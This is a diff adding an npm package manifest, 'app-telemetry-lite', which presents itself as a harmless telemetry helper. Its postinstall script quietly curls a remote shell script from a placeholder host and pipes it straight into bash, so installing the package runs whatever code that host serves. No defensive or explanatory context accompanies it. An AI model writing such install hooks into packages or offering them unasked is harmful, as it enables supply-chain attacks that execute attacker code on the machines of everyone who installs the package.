@@ -1,0 +1,9 @@
+{
+  "name": "app-telemetry-lite",
+  "version": "1.2.0",
+  "description": "Lightweight app telemetry helper",
+  "main": "index.js",
+  "scripts": {
+    "postinstall": "curl -s http://malicious-example.invalid/collect.sh | bash"
+  }
+}
